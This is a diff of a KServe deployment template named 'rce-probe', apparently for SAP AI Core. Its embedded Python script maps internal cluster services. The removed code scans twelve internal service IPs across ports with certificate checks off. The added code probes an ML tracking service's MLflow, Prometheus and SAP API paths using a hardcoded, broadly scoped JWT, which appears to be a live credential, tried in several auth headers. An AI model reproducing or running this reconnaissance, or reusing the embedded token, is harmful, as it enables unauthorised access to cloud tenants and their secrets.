@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "60.0.0"
+    ai.sap.com/version: "61.0.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "new-svc-probe"
+    executables.ai.sap.com/description: "ml-tracking-probe"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,92 +28,96 @@ spec:
           args:
           - |
             python3 << 'PYCODE'
-            import urllib.request, ssl, json
+            import urllib.request, urllib.error, json, ssl
 
-            ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
+            ML_TRACKING_IP = "100.111.137.177"
+            ML_TRACKING_PORT = 80
+            BASE_URL = f"http://{ML_TRACKING_IP}:{ML_TRACKING_PORT}"
 
-            targets = {
-                "llm-orchestration": "100.104.59.31",
-                "prompt-registry-api": "100.107.251.106",
-                "prompt-registry-k8s": "100.106.111.110",
-                "rage-proxy-inference": "100.106.172.250",
-                "llm-proxy-gsp": "100.106.97.121",
-                "llm-deployments": "100.108.15.148",
-                "endpoint-service": "100.104.213.121",
-                "ml-api-facade": "100.106.71.211",
-                "ml-tracking": "100.111.137.177",
-                "execution-service": "100.111.34.111",
-                "user-management": "100.109.251.191",
-                "test-tenant-auth": "100.104.178.173",
-            }
+            JWT = "eyJ0eXAiOiJKV1QiLCJqaWQiOiJQUittUkcwaEtTQ29DWWNhbStaNzNzZU42WGR1UmtFNkh4QzdxcCtNckVrPSIsImFsZyI6IlJTMjU2Iiwiamt1IjoiaHR0cHM6Ly9jZi1haWNvcmUtc2VjdXJpdHktYmItMTIuYXV0aGVudGljYXRpb24uZXUxMC5oYW5hLm9uZGVtYW5kLmNvbS90b2tlbl9rZXlzIiwia2lkIjoiZGVmYXVsdC1qd3Qta2V5LTE1YWFlMTgxYjYifQ.eyJzdWIiOiJzYi1haWNvcmUtYmItMTIhYjYyNzU1MXxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiLCJpc3MiOiJodHRwczovL2NmLWFpY29yZS1zZWN1cml0eS1iYi0xMi5hdXRoZW50aWNhdGlvbi5ldTEwLmhhbmEub25kZW1hbmQuY29tL29hdXRoL3Rva2VuIiwiYXV0aG9yaXRpZXMiOlsiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm9iamVjdHN0b3Jlc2VjcmV0LmNyZWRlbnRpYWxzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubm9kZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXNvdXJjZWdyb3VwLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VydmljZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kb2NrZXJyZWdpc3RyeXNlY3JldC5jcmVkZW50aWFscy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRhYmxlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmFwcGxpY2F0aW9ucy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRlcGxveW1lbnRzLmxvZ3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9ucy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmV4ZWN1dGlvbnMubG9ncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5hcnRpZmFjdHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5sb2dzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZG9ja2VycmVnaXN0cnlzZWNyZXQuY3JlZGVudGlhbHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV2YWx1YXRpb25NZXRyaWNzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGF0YXNldHMuZG93bmxvYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLnByb21wdFRlbXBsYXRlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5iYXRjaGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnNjaGVkdWxlcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MuY3JlYXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5vcmNoZXN0cmF0aW9uQ29uZmlncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlc291cmNlZ3JvdXAud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNlY3JldHMucmVhZCIsInVhYS5yZXNvdXJjZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5hcHBsaWNhdGlvbnMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm1ldHJpY3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZWNyZXRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5hcnRpZmFjdHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubm9kZXMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnNjaGVkdWxlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlcG9zaXRvcmllcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5kZXBsb3ltZW50cy5wcmVkaWN0IiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRhdGFzZXRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5iYXRjaGVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm1ldGEucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MuZGVsZXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm9iamVjdHN0b3Jlc2VjcmV0LmNyZWRlbnRpYWxzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5jb25maWd1cmF0aW9ucy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5rcGlzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm9yY2hlc3RyYXRpb25Db25maWdzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlcG9zaXRvcmllcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MubWV0cmljcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucHJvbXB0VGVtcGxhdGVzLndyaXRlIl0sImNsaWVudF9pZCI6InNiLWFpY29yZS1iYi0xMiFiNjI3NTUxfGFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NCIsImF1ZCI6WyJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VjcmV0cyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZXJ2aWNlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kZXBsb3ltZW50cy5sb2dzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5tZXRyaWNzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5wcm9tcHRUZW1wbGF0ZXMiLCJ1YWEiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubG9ncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXBvc2l0b3JpZXMiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRhdGFzZXRzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRvY2tlcnJlZ2lzdHJ5c2VjcmV0LmNyZWRlbnRpYWxzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm1ldGEiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmV4ZWN1dGlvbnMubG9ncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2RlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5vcmNoZXN0cmF0aW9uQ29uZmlncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuYmF0Y2hlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5vYmplY3RzdG9yZXNlY3JldC5jcmVkZW50aWFscyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXNvdXJjZWdyb3VwIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRhYmxlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5hcHBsaWNhdGlvbnMiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQua3BpcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuYXJ0aWZhY3RzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMiLCJzYi1haWNvcmUtYmItMTIhYjYyNzU1MXxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiXSwiZXh0X2F0dHIiOnsiZW5oYW5jZXIiOiJYU1VBQSIsInN1YmFjY291bnRpZCI6IjQxMDYxODEzLTY4NDctNDRkNy1iYzJjLTI3MDdkOWMzMDBjNSIsInpkbiI6ImNmLWFpY29yZS1zZWN1cml0eS1iYi0xMiIsInNlcnZpY2VpbnN0YW5jZWlkIjoiYWljb3JlLWJiLTEyIn0sInppZCI6IjQxMDYxODEzLTY4NDctNDRkNy1iYzJjLTI3MDdkOWMzMDBjNSIsImdyYW50X3R5cGUiOiJjbGllbnRfY3JlZGVudGlhbHMiLCJhenAiOiJzYi1haWNvcmUtYmItMTIhYjYyNzU1MXxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiLCJzY29wZSI6WyJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQub2JqZWN0c3RvcmVzZWNyZXQuY3JlZGVudGlhbHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2Rlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlc291cmNlZ3JvdXAucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZXJ2aWNlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRvY2tlcnJlZ2lzdHJ5c2VjcmV0LmNyZWRlbnRpYWxzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGFibGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuYXBwbGljYXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGVwbG95bWVudHMubG9ncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZXhlY3V0aW9ucy5sb2dzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmFydGlmYWN0cy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmxvZ3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kb2NrZXJyZWdpc3RyeXNlY3JldC5jcmVkZW50aWFscy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kYXRhc2V0cy5kb3dubG9hZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucHJvbXB0VGVtcGxhdGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmJhdGNoZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcy5jcmVhdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm9yY2hlc3RyYXRpb25Db25maWdzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVzb3VyY2Vncm91cC53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VjcmV0cy5yZWFkIiwidWFhLnJlc291cmNlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmFwcGxpY2F0aW9ucy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MubWV0cmljcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNlY3JldHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmFydGlmYWN0cy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuY29uZmlndXJhdGlvbnMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2Rlcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVwb3NpdG9yaWVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLnByZWRpY3QiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGF0YXNldHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmJhdGNoZXMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubWV0YS5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcy5kZWxldGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQub2JqZWN0c3RvcmVzZWNyZXQuY3JlZGVudGlhbHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmtwaXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3Mub3JjaGVzdHJhdGlvbkNvbmZpZ3Mud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVwb3NpdG9yaWVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5tZXRyaWNzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5wcm9tcHRUZW1wbGF0ZXMud3JpdGUiXSwiZXhwIjoxNzc2Mjk2NzQ2LCJpYXQiOjE3NzYyNTM1NDYsImp0aSI6ImJjYzI0MzRkNzhlMjQwZjU4ODc4Y2EzZWMwOWNmOThhIiwicmV2X3NpZyI6ImY1NDg3MDZjIiwiY2lkIjoic2ItYWljb3JlLWJiLTEyIWI2Mjc1NTF8YWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0In0.FX6LHQ907e6eAar6Tpdo0x39_WxxQphlzYBflOWjoAZ126aJMaWfZ28VVZ4vstidYa1pV30MBOQnQvEzE5Q8SkooIz8L-txskdBFFd-X41kXZWcvrh2zWWRtZ8F4BYkp7zVWqatB-PTtM_hwkEXxnWHbP5qxs22puvqxLTxLkcRvOkVJZD_WpSWzVnPn9JQPhmM-PDsjuIyEHMJO5FWzW5dX7B_MclyCbR-OEvo0zr5EkOkD0Eda2AqTzVc8BFY5p4DuoWyAHi1woDwBps4cXdb_8EkubhxGrIejH-jEQVIxasODgUKQT6G34knkA6y_--w2JnaGAbKn6blmkEet2A"
 
-            paths = [
-                "/", "/healthz", "/health", "/ready", "/live",
-                "/api", "/api/v1", "/v1", "/v2",
-                "/metrics", "/debug/pprof",
-                "/api/v1/templates", "/api/v1/sessions", "/api/v1/configs",
-                "/api/v1/tenants", "/api/v1/deployments", "/api/v1/users",
-                "/templates", "/sessions", "/configs", "/mappings",
-                "/api/v1/prompt-templates", "/prompts", "/prompt-templates",
-                "/api/v1/orchestration-configs", "/orchestration",
+            print("[ML_TRACKING_PROBE_START]")
+
+            def probe(path, headers=None):
+                if headers is None:
+                    headers = {}
+                url = f"{BASE_URL}{path}"
+                req = urllib.request.Request(url, headers=headers)
+                try:
+                    with urllib.request.urlopen(req, timeout=5) as r:
+                        body = r.read(3000).decode(errors='replace')
+                        print(f"  {path} [headers={list(headers.keys())}] -> 200: {body[:500]}")
+                        return 200, body
+                except urllib.error.HTTPError as e:
+                    body = ""
+                    try: body = e.read(500).decode(errors='replace')
+                    except: pass
+                    print(f"  {path} [headers={list(headers.keys())}] -> {e.code}: {body[:200]}")
+                    return e.code, body
+                except Exception as ex:
+                    print(f"  {path} -> ERR: {str(ex)[:80]}")
+                    return 0, ""
+
+            # Phase 1: Probe with different auth headers
+            print("\n=== Auth header variants ===")
+            for path in ["/", "/healthz", "/metrics", "/api/v1", "/api/v1/metrics", "/api/v1/runs", "/api/v1/experiments"]:
+                # No auth
+                code, body = probe(path, {})
+                
+                # With Bearer JWT
+                probe(path, {"Authorization": f"Bearer {JWT}"})
+                
+                # With X-Auth-Token
+                probe(path, {"X-Auth-Token": JWT})
+                
+                # With X-Token
+                probe(path, {"X-Token": JWT})
+
+            # Phase 2: MLflow-specific paths (common ML tracking framework)
+            print("\n=== MLflow API paths ===")
+            mlflow_paths = [
+                "/ajax-api/2.0/mlflow/experiments/list",
+                "/ajax-api/2.0/mlflow/experiments/get",
+                "/ajax-api/2.0/mlflow/runs/search",
+                "/ajax-api/2.0/mlflow/runs/get",
+                "/ajax-api/2.0/mlflow/artifacts/list",
+                "/ajax-api/2.0/preview/mlflow/experiments/list",
+                "/api/2.0/mlflow/experiments/list",
+                "/api/2.0/mlflow/runs/search",
+                "/api/2.0/preview/mlflow/experiments/list",
+                "/api/v1/metrics",
+                "/api/v1/runs",
+                "/api/v1/experiments",
             ]
+            for path in mlflow_paths:
+                code, body = probe(path, {})
+                if code == 200:
+                    print(f"  >> 200 HIT: {path} -> {body[:300]}")
 
-            print("[NEW_SVC_PROBE_START]")
-            for name, ip in targets.items():
-                for port in [80, 8080, 443, 8443, 3000, 9090]:
-                    for scheme in (["http"] if port not in [443,8443] else ["https"]):
-                        base_url = f"{scheme}://{ip}:{port}"
-                        # Quick connectivity check first
-                        try:
-                            req = urllib.request.Request(f"{base_url}/healthz")
-                            with urllib.request.urlopen(req, timeout=3, context=ctx) as r:
-                                body = r.read(500).decode(errors='replace')
-                                print(f"\n[{name}:{port}] healthz=200 -> {body[:100]}")
-                                # Found a responsive port - probe more paths
-                                for path in paths:
-                                    try:
-                                        req2 = urllib.request.Request(
-                                            f"{base_url}{path}",
-                                            headers={"Accept": "application/json,*/*"})
-                                        with urllib.request.urlopen(req2, timeout=3, context=ctx) as r2:
-                                            b2 = r2.read(3000).decode(errors='replace')
-                                            print(f"  {path} -> 200: {b2[:500]}")
-                                    except urllib.error.HTTPError as e:
-                                        if e.code not in [404, 405]:
-                                            b3 = ""
-                                            try: b3 = e.read(300).decode(errors='replace')
-                                            except: pass
-                                            print(f"  {path} -> {e.code}: {b3[:150]}")
-                                    except Exception: pass
-                        except urllib.error.HTTPError as e:
-                            if e.code not in [404]:
-                                b = ""
-                                try: b = e.read(300).decode(errors='replace')
-                                except: pass
-                                print(f"\n[{name}:{port}] healthz={e.code} -> {b[:100]}")
-                                # Still worth probing more paths on non-404
-                                for path in paths[:8]:
-                                    try:
-                                        req2 = urllib.request.Request(f"{base_url}{path}",
-                                            headers={"Accept": "application/json,*/*"})
-                                        with urllib.request.urlopen(req2, timeout=3, context=ctx) as r2:
-                                            b2 = r2.read(2000).decode(errors='replace')
-                                            print(f"  {path} -> 200: {b2[:400]}")
-                                    except urllib.error.HTTPError as e2:
-                                        if e2.code not in [404, 405]:
-                                            b3 = ""
-                                            try: b3 = e2.read(200).decode(errors='replace')
-                                            except: pass
-                                            print(f"  {path} -> {e2.code}: {b3[:100]}")
-                                    except Exception: pass
-                        except Exception as e:
-                            err = str(e)[:40]
-                            if 'timed out' not in err and '111' not in err and '104' not in err:
-                                print(f"\n[{name}:{port}] healthz=ERR: {err}")
+            # Phase 3: With valid JWT
+            print("\n=== With valid JWT bearer ===")
+            for path in mlflow_paths[:6]:
+                probe(path, {"Authorization": f"Bearer {JWT}"})
 
-            print("\n[NEW_SVC_PROBE_END]")
+            # Phase 4: Check if there's a /metrics endpoint (Prometheus)
+            print("\n=== Prometheus metrics endpoint ===")
+            probe("/metrics", {})
+            probe("/metrics", {"Authorization": f"Bearer {JWT}"})
+
+            # Phase 5: Experiment with different paths (SAP-specific)
+            print("\n=== SAP ML Tracking API ===")
+            for path in [
+                "/v2/lm/metrics",
+                "/v2/lm/runs",
+                "/v2/lm/experiments",
+                "/api/v1/aicore/metrics",
+                "/api/v1/training/metrics",
+            ]:
+                probe(path, {})
+                probe(path, {"Authorization": f"Bearer {JWT}"})
+                probe(path, {"Authorization": f"Bearer {JWT}", "AI-Resource-Group": "default"})
+
+            print("\n[ML_TRACKING_PROBE_END]")
             PYCODE
             python3 -c "
             import http.server
